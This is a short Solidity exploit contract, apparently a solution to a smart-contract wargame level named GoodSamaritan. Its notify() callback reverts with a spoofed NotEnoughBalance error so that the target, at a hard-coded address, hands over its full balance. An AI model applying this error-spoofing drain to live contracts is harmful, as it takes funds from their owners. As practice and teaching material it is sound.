// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INotifyable {
    function notify(uint256 amount) external;
}

interface GoodSamaritan{
    function requestDonation() external returns (bool enoughBalance) ;
}

error NotEnoughBalance();
contract Attack is INotifyable{
    GoodSamaritan public goodSamaritan=GoodSamaritan(address(0xF512823D84920AA135Ec089BFcb7fCa8aCB51b77));

   function notify(uint256 amount) external override {
       if(amount==10)
       revert NotEnoughBalance();
   }

   function attack() external {
    goodSamaritan.requestDonation();
       
   }
}



